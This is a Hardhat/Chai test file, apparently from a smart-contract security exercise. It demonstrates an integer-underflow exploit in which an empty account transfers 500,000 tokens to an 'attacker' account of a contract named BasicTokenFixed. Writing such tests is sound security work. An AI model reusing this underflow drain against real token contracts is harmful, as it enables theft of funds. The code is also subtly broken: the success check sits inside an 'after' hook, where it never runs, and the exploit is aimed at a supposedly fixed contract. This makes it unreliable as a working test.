// Importing necessary modules and libraries
const { ethers } = require("hardhat"); // Provides a development environment for Ethereum, simplifying tasks like compilation, testing, and deployment
const { expect } = require("chai"); // Assertion library to write test assertions

// Description of the test suite
describe("Basic Token Minting Underflow Testing Suite", function () {
  let deployer, attacker;

  // Setting the amount to mint for the attacker and deployer
  const ATTACKER1_MINT = ethers.utils.parseEther("100"); // 100 tokens for the attacker
  const DEPLOYER_MINT = ethers.utils.parseEther("1000"); // 1000 tokens for the deployer

  // The "before" hook is used to set up the environment before executing the tests
  before(async function () {
    // Retrieving signers from the environment; these represent the accounts that can be used in the test
    [deployer, attacker] = await ethers.getSigners();

    // Deploying the token contract using the deployer account
    const tokenFactory = await ethers.getContractFactory(
      "./BasicTokenFixed.sol:BasicTokenFixed",
      deployer
    );
    this.token = await tokenFactory.deploy();

    // Minting initial amounts to the deployer and attacker accounts
    await this.token.mint(deployer.address, DEPLOYER_MINT);
    await this.token.mint(attacker.address, ATTACKER1_MINT);
  });
  // Test case for the exploit
  it("[Test I] Should demonstrate an underflow exploit by transferring tokens", async function () {
    // Creating a new signer called user1, which will have a default balance of 0
    let user1 = await ethers.getSigner(2);

    // Creating an "underflow" variable, equal to 500,000 tokens
    let underflow = ethers.utils.parseEther("500000");

    // Transferring the "underflow" amount from user1 to attacker, triggering the underflow
    await this.token.connect(user1).transfer(attacker.address, underflow);
  });

  after(async function () {
    // Success Condition for the exploit
    it("[Test II] Should verify that the attacker has at least 500,000 tokens after the exploit", async function () {
      // Expectation: Attacker should have a significant number of tokens (at least more than 500,000)
      // This checks the final balance of the attacker's address, ensuring that the underflow exploit worked as intended
      expect(await this.token.getBalance(attacker.address)).to.be.gt(
        ethers.utils.parseEther("500000")
      );
    });
  });
});
